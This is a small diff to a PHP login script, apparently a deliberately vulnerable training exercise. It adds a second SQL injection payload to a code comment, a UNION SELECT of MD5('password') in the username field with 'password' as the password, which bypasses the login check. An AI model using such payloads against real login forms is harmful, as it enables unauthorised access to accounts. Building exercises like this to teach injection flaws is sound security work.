@@ -10,6 +10,9 @@ if (isset($_POST["username"])){
 	/*
 	username: 	' UNION SELECT '5f4dcc3b5aa765d61d8327deb882cf99' from users -- '
 	password:	password
+	
+	username: 	' UNION SELECT MD5('password') from users; -- ' 
+	password:	password
 	*/
 	
 	include "credentials/iss.php";
